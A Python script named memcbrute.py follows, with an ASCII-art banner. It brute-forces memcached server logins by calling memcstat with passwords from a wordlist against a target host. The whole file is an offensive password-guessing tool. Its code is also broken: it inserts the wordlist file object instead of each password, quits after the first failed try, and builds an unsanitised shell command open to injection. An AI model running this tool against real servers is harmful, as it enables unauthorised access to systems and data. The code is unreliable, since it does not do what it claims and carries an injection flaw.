#!/usr/bin/env python3

import subprocess
import sys
from time import sleep
from termcolor import colored

art = ("""

@@@@@@@@@@  @@@@@@@@ @@@@@@@@@@   @@@@@@@ @@@@@@@  @@@@@@@  @@@  @@@ @@@@@@@ @@@@@@@@
 @@! @@! @@! @@!      @@! @@! @@! !@@      @@!  @@@ @@!  @@@ @@!  @@@   @@!   @@!
 @!! !!@ @!@ @!!!:!   @!! !!@ @!@ !@!      @!@!@!@  @!@!!@!  @!@  !@!   @!!   @!!!:!
 !!:     !!: !!:      !!:     !!: :!!      !!:  !!! !!: :!!  !!:  !!!   !!:   !!:
  :      :   : :: :::  :      :    :: :: : :: : ::   :   : :  :.:: :     :    : :: :::

""")

usage = ("Usage: ./memcbrute.py <target> <username> <wordlist>")

def bruteforce(target, user, wordlist):
    try:
        for passwd in wordlist:
            cmd = subprocess.getoutput("/bin/memcstat --servers={} --username={} --password={}".format(target, user, wordlist))
            if len(cmd) > 0:
                #print(cmd) #Enable if you want to see the output of the command
                print(colored('[+] Password found: {}'.format(passwd), "green"))
                break

            else:
                print(colored("[-] Password was not found !","red"))
                sleep(1.5)
                print(colored("[*] Maybe use a different wordlist...?","yellow"))
                sys.exit(0)

    except KeyboardInterrupt:
        print(colored("[!] CTRL + C detected, exiting..."))
        sleep(0.8)
        sys.exit(0)

if __name__ == "__main__":
    try:
        user = sys.argv[1]
        target = sys.argv[2]
        wordlist = open(sys.argv[3], 'r')

        print(art)
        bruteforce(user, target, wordlist)

    except IndexError:
        print(art)
        print(colored("[-] No arguments provided !","red"))
        print(usage)
